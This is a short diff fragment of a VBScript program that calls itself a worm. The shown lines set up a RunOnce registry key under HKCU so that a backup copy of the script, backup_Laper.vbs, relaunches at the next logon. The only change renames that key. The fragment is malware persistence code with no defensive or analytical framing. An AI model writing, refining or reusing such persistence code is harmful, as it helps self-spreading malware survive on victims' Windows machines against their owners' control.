@@ -63,7 +63,7 @@ objRegistry.RegWrite strRegistryPath & "\" & strRegistryKey, strRegistryValue, "
 
 ' Create a backup registry key for the worm's backup file
 strBackupRegistryPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
-strBackupRegistryKey = "Laper_backup"
+strBackupRegistryKey = "Lappy.vbs_backup"
 
 If Not objFSO.FileExists(objFSO.BuildPath(objFSO.GetParentFolderName(WScript.ScriptFullName), "backup_Laper.vbs")) Then
     strBackupRegistryValue = chr(34) & objFSO.BuildPath(objFSO.GetParentFolderName(WScript.ScriptFullName), "backup_Laper.vbs") & chr(34)
